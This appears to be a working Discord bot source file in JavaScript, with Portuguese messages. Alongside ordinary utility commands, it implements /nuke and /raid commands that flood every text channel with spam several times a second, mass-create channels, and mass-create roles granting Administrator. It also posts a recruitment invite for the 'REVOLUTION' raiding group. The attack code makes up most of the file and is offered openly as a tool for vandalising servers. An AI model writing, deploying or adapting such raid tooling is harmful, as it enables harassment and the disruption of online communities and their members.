const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require('discord.js');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ============ CLIENT ============
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.commands = new Map();

// ============ GERENCIADOR DE ATAQUE ============
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
  }

  startNuke(guild, user, client) {
    const guildId = guild.id;
    
    if (this.activeAttacks.has(guildId)) {
      this.stopAttack(guildId);
    }

    let isRunning = true;
    let messageCount = 0;

    // SPAM REVOLUTION EM TODOS OS CANAIS
    const spamFunction = async () => {
      if (!isRunning) return;
      
      try {
        const channels = guild.channels.cache.filter(ch => 
          ch.isTextBased() && 
          ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
        );
        
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;

        for (const channel of channelArray.slice(0, 5)) {
          if (!isRunning) break;
          try {
            const message = 'REVOLUTION '.repeat(100);
            await channel.send(message);
            messageCount++;
          } catch (error) {}
        }
        
        if (messageCount % 10 === 0) {
          console.log(`📢 NUKE #${messageCount} enviado`);
        }
      } catch (error) {}
    };

    // EXECUTA A CADA 500ms (RAPIDO)
    const interval = setInterval(spamFunction, 500);

    // EXECUTA IMEDIATAMENTE
    for (let i = 0; i < 5; i++) {
      setTimeout(spamFunction, i * 100);
    }

    this.activeAttacks.set(guildId, {
      interval,
      isRunning,
      type: 'nuke',
      target: guild.name,
      author: user.tag,
      startTime: new Date(),
      messageCount: 0,
      stop: () => {
        isRunning = false;
        clearInterval(interval);
        this.activeAttacks.delete(guildId);
        console.log(`🛑 NUKE PARADO no servidor ${guild.name}`);
      }
    });

    console.log(`🔥 NUKE iniciado no servidor ${guild.name} por ${user.tag}`);
    return this.activeAttacks.get(guildId);
  }

  startAttack(guild, user, motivo, client) {
    const guildId = guild.id;
    
    if (this.activeAttacks.has(guildId)) {
      this.stopAttack(guildId);
    }

    let isRunning = true;

    // CRIAÇÃO RÁPIDA DE CARGOS
    const createRole = async () => {
      if (!isRunning) return;
      try {
        await guild.roles.create({
          name: 'RAID BY REVOLUTION',
          color: '#ff0000',
          permissions: [PermissionsBitField.Flags.Administrator]
        });
      } catch (error) {}
    };

    for (let i = 0; i < 5; i++) createRole();
    const roleInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) createRole();
    }, 200);

    // CRIAÇÃO RÁPIDA DE CANAIS
    let channelCounter = 0;
    const createChannel = async () => {
      if (!isRunning) return;
      try {
        channelCounter++;
        const channelName = `raid-by-revolution-${channelCounter}`;
        const existing = guild.channels.cache.find(c => c.name === channelName);
        if (!existing) {
          await guild.channels.create({
            name: channelName,
            type: 0,
            permissionOverwrites: [
              {
                id: guild.id,
                allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory']
              }
            ]
          });
        }
      } catch (error) {}
    };

    for (let i = 0; i < 5; i++) createChannel();
    const channelInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) createChannel();
    }, 200);

    // SPAM
    const spamMessages = [
      `SERVIDOR TOMADO POR REVOLUTION, SAIAM DAS TREVAS\n\n${user.tag} INICIOU O ATAQUE\n\nJUNTE-SE A REVOLUTION\nhttps://discord.gg/GJAKrmDuMp`
    ];

    const spamFunction = async () => {
      if (!isRunning) return;
      try {
        const channels = guild.channels.cache.filter(ch => 
          ch.isTextBased() && 
          ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
        );
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;

        for (const channel of channelArray.slice(0, 5)) {
          if (!isRunning) break;
          try {
            const randomMessage = spamMessages[0];
            await channel.send(randomMessage);
          } catch (error) {}
        }
      } catch (error) {}
    };

    const spamInterval = setInterval(spamFunction, 200);
    for (let i = 0; i < 5; i++) {
      setTimeout(spamFunction, i * 50);
    }

    this.activeAttacks.set(guildId, {
      spamInterval,
      channelInterval,
      roleInterval,
      isRunning,
      type: 'attack',
      target: guild.name,
      author: user.tag,
      startTime: new Date(),
      stop: () => {
        isRunning = false;
        clearInterval(spamInterval);
        clearInterval(channelInterval);
        clearInterval(roleInterval);
        this.activeAttacks.delete(guildId);
        console.log(`🛑 ATAQUE PARADO no servidor ${guild.name}`);
      }
    });

    return this.activeAttacks.get(guildId);
  }

  stopAttack(guildId) {
    const attack = this.activeAttacks.get(guildId);
    if (attack) {
      attack.stop();
      return true;
    }
    return false;
  }

  getStatus(guildId) {
    return this.activeAttacks.get(guildId) || null;
  }
}

const attackManager = new AttackManager();

// ============ LOGGER ============
function log(message, type = 'INFO') {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [${type}] ${message}`);
  
  const logDir = './logs';
  if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
  fs.appendFileSync(`${logDir}/bot.log`, `[${timestamp}] [${type}] ${message}\n`);
}

// ============ COMANDO: NUKE ============
client.commands.set('nuke', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({
        content: '❌ VOCE PRECISA SER ADMINISTRADOR NO SERVIDOR.',
        ephemeral: true
      });
    }

    try {
      attackManager.startNuke(interaction.guild, interaction.user, client);

      const embed = new EmbedBuilder()
        .setTitle('🔥 NUKE INICIADO')
        .setColor('#ff0000')
        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE REVOLUTION`)
        .addFields(
          { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
          { name: 'PARAR', value: 'USE /end PARA PARAR', inline: true }
        )
        .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
        .setFooter({ text: 'REVOLUTION - NUKE' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      log(`🔥 NUKE iniciado por ${interaction.user.tag}`);

    } catch (error) {
      await interaction.reply({ 
        content: `❌ ERRO: ${error.message}`,
        ephemeral: true
      });
    }
  }
});

// ============ COMANDO: RAID ============
client.commands.set('raid', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({
        content: '❌ VOCE PRECISA SER ADMINISTRADOR NO SERVIDOR.',
        ephemeral: true
      });
    }

    const motivo = interaction.options.getString('motivo') || 'OPERACAO REVOLUTION';

    try {
      attackManager.startAttack(interaction.guild, interaction.user, motivo, client);

      const embed = new EmbedBuilder()
        .setTitle('🔥 RAID INICIADO')
        .setColor('#ff0000')
        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE`)
        .addFields(
          { name: 'MOTIVO', value: motivo, inline: true },
          { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
          { name: 'PARAR', value: 'USE /end PARA PARAR', inline: true }
        )
        .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
        .setFooter({ text: 'REVOLUTION - RAID' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      log(`🔥 RAID iniciado por ${interaction.user.tag}`);

    } catch (error) {
      await interaction.reply({ 
        content: `❌ ERRO: ${error.message}`,
        ephemeral: true
      });
    }
  }
});

// ============ COMANDO: END ============
client.commands.set('end', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    const guildId = interaction.guild.id;
    const attack = attackManager.getStatus(guildId);
    
    if (attack) {
      attackManager.stopAttack(guildId);
      
      const embed = new EmbedBuilder()
        .setTitle('🛑 ATAQUE PARADO')
        .setColor('#00ff00')
        .setDescription('O ATAQUE REVOLUTION FOI DESATIVADO')
        .addFields(
          { name: 'PARADO POR', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE PARADO', inline: true }
        )
        .setFooter({ text: 'REVOLUTION - DESATIVADO' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      log(`🛑 END executado por ${interaction.user.tag}`);
    } else {
      await interaction.reply({
        content: '❌ NENHUM ATAQUE ATIVO PARA PARAR.',
        ephemeral: true
      });
    }
  }
});

// ============ COMANDOS DO DIA A DIA ============

// /ping - Verificar latência
client.commands.set('ping', {
  execute: async (interaction) => {
    const sent = await interaction.reply({ content: '🏓 Pong!', fetchReply: true });
    const latency = sent.createdTimestamp - interaction.createdTimestamp;
    await interaction.editReply(`🏓 Pong! Latência: ${latency}ms | API: ${Math.round(client.ws.ping)}ms`);
  }
});

// /info - Informações do servidor
client.commands.set('info', {
  execute: async (interaction) => {
    const guild = interaction.guild;
    const embed = new EmbedBuilder()
      .setTitle(`📊 INFORMAÇÕES DO SERVIDOR`)
      .setColor('#0099ff')
      .addFields(
        { name: '📛 NOME', value: guild.name, inline: true },
        { name: '👑 DONO', value: guild.members.cache.get(guild.ownerId)?.user.tag || 'N/A', inline: true },
        { name: '👥 MEMBROS', value: `${guild.memberCount}`, inline: true },
        { name: '📅 CRIADO EM', value: new Date(guild.createdAt).toLocaleDateString('pt-BR'), inline: true },
        { name: '💬 CANAIS', value: `${guild.channels.cache.size}`, inline: true },
        { name: '🎭 CARGOS', value: `${guild.roles.cache.size}`, inline: true }
      )
      .setThumbnail(guild.iconURL())
      .setTimestamp();

    await interaction.reply({ embeds: [embed] });
  }
});

// /avatar - Ver avatar de um usuário
client.commands.set('avatar', {
  execute: async (interaction) => {
    const user = interaction.options.getUser('usuario') || interaction.user;
    const embed = new EmbedBuilder()
      .setTitle(`🖼️ AVATAR DE ${user.tag}`)
      .setImage(user.displayAvatarURL({ size: 1024, dynamic: true }))
      .setColor('#0099ff')
      .setTimestamp();

    await interaction.reply({ embeds: [embed] });
  }
});

// /say - Repetir mensagem
client.commands.set('say', {
  execute: async (interaction) => {
    const mensagem = interaction.options.getString('mensagem');
    if (!mensagem) {
      return interaction.reply({ content: '❌ DIGITE UMA MENSAGEM!', ephemeral: true });
    }
    await interaction.reply({ content: mensagem });
  }
});

// /clear - Limpar mensagens
client.commands.set('clear', {
  execute: async (interaction) => {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
      return interaction.reply({ content: '❌ SEM PERMISSÃO!', ephemeral: true });
    }

    const quantidade = interaction.options.getInteger('quantidade') || 10;
    
    try {
      const deleted = await interaction.channel.bulkDelete(quantidade, true);
      await interaction.reply({
        content: `✅ ${deleted.size} MENSAGENS APAGADAS!`,
        ephemeral: true
      });
    } catch (error) {
      await interaction.reply({
        content: `❌ ERRO: ${error.message}`,
        ephemeral: true
      });
    }
  }
});

// /userinfo - Informações do usuário
client.commands.set('userinfo', {
  execute: async (interaction) => {
    const user = interaction.options.getUser('usuario') || interaction.user;
    const member = interaction.guild.members.cache.get(user.id);
    
    const embed = new EmbedBuilder()
      .setTitle(`👤 INFORMAÇÕES DE ${user.tag}`)
      .setColor('#0099ff')
      .addFields(
        { name: '📛 NOME', value: user.tag, inline: true },
        { name: '🆔 ID', value: user.id, inline: true },
        { name: '📅 CRIOU CONTA', value: new Date(user.createdAt).toLocaleDateString('pt-BR'), inline: true },
        { name: '📅 ENTROU NO SERVIDOR', value: member ? new Date(member.joinedAt).toLocaleDateString('pt-BR') : 'N/A', inline: true }
      )
      .setThumbnail(user.displayAvatarURL())
      .setTimestamp();

    await interaction.reply({ embeds: [embed] });
  }
});

// ============ EVENTOS ============

client.on('ready', () => {
  log(`🚀 Bot ${client.user.tag} esta ONLINE!`);
  log(`📊 Servidores: ${client.guilds.cache.size}`);
  
  client.user.setPresence({
    activities: [{
      name: 'REVOLUTION | /help',
      type: 3,
      state: 'Use /help para comandos'
    }],
    status: 'online'
  });
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) {
    return interaction.reply({
      content: '❌ COMANDO NAO ENCONTRADO!',
      ephemeral: true
    });
  }

  try {
    await command.execute(interaction);
  } catch (error) {
    log(`Erro no comando ${interaction.commandName}: ${error.message}`, 'ERROR');
    
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    } else {
      await interaction.reply({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    }
  }
});

// ============ SERVIDOR WEB ============
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot Revolution esta ONLINE!');
});

app.get('/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    ataquesAtivos: attackManager.activeAttacks.size,
    servidores: client.guilds.cache.size
  });
});

app.listen(PORT, () => {
  console.log(`Servidor web rodando na porta ${PORT}`);
});

// ============ LOGIN ============

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error('TOKEN NAO ENCONTRADO! Configure o .env');
  process.exit(1);
}

client.login(TOKEN).catch(error => {
  log(`Erro ao fazer login: ${error.message}`, 'ERROR');
  process.exit(1);
});
